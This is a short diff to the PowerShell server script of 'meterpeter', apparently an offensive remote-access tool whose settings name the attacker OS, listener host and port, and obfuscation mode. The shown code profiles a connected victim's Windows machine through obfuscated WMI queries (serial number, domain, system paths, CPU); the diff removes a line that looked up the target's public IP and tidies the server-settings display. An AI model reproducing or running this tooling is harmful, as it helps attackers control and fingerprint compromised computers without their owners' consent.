@@ -366,11 +366,8 @@ $WindowsDirectory = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem)
 $serial = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SerialNumber");
 $syst_dir = Character_Obfuscation("(Get-WmiObject Win32_OperatingSystem).SystemDirectory");
 $Processor = Character_Obfuscation("(Get-WmiObject Win32_processor).Caption");
-$PublicIP = ("(curl http://ipinfo.io/ip).content");
 
 $Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor";
-## UN_COMMENT THE NEXT LINE TO DISPLAY TARGET PUBLIC IP ADDRESS
-#$Command = "`"`n   Host          : `"+`"$Remote_Host`"+`"``n   System        : `"+$System+`"``n   Version       : `"+$Version+`"``n   Architecture  : `"+$Architecture+`"``n   DomainName    : `"+$Name+`"``n   WindowsDir    : `"+$WindowsDirectory+`"``n   SystemDir     : `"+$syst_dir+`"``n   SerialNumber  : `"+$serial+`"``n   ProcessorCPU  : `"+$Processor+`"``n   Public IP     : `"+$PublicIP";
 
 
 While($Client.Connected)
@@ -395,13 +392,13 @@ While($Client.Connected)
       $SerSat = "$Local_Host"+":"+"$Local_Port";
       write-host "`n`n Server Settings" -ForegroundColor green;
       write-host " ---------------";
-      write-host " meterpeter dev       : $dev_Version";
-      write-host " Local Architecture   : $env:PROCESSOR_ARCHITECTURE";
-      write-host " Obuscation Sellected : $ob";
-      write-host " Attacker OS flavor   : $Flavor Distro";
-      write-host " Lhost|Lport Settings : $SerSat";
-      write-host " meterpeter WebServer : $APACHE";
-      write-host " meterpeter Server    : $Parse";
+      write-host " meterpeter dev        : $dev_Version";
+      write-host " Local Architecture    : $env:PROCESSOR_ARCHITECTURE";
+      write-host " Obfuscation Sellected : $ob";
+      write-host " Attacker OS flavor    : $Flavor Distro";
+      write-host " Lhost|Lport Settings  : $SerSat";
+      write-host " meterpeter WebServer  : $APACHE";
+      write-host " meterpeter Server     : $Parse";
     }
 
     ## venom v1.0.16 function
